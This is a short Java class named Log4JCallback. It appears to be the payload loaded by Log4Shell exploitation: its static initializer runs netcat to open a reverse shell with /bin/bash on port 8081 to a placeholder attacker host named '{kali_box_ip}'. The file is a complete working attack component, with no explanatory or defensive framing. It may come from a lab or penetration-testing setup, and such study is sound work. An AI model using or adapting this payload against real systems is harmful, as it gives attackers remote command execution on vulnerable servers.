public class Log4JCallback {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc {kali_box_ip} 8081 -e /bin/bash");
        } catch (Exception err) {
            err.printStackTrace();
        }
    }
}
